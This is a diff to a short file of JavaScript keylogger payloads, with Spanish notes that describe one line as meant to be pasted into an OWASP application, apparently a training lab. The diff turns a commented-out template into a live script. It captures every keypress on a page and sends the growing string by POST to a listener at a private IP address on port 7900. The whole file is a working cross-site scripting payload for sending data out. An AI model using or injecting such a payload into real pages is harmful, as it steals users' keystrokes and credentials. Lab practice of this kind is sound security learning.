@@ -1,17 +1,16 @@
-<script type="text/javascript">var l = "";document.onkeypress = function (e) {l += e.key;var req = new XMLHttpRequest();req.open("POST","http://192.168.0.59:7900/", true);req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");req.send("data=" + l);}</script>
+Linea para pegar en owasp 
+<script type="text/javascript">var l = "";document.onkeypress = function (e) {l += e.key;var req = new XMLHttpRequest();req.open("POST","http://192.168.0.70:7900/", true);req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");req.send("data=" + l);}</script>
 
+Mismo codigo mas prolijo
  <script type="text/javascript">
-    var l = "";             // empty string to concatenate keys onto
+    var l = "";  
+
     document.onkeypress = function (e) {
         l += e.key;
-        console.log(l);     // remove this line 
-
-        /*
         var req = new XMLHttpRequest();
-        req.open("POST","<server goes here>", true); 				// ADD URL HERE!
+        req.open("POST","http://192.168.0.70:7900/", true); 			
         req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         req.send("data=" + l);
-        */
     }
 </script>
 
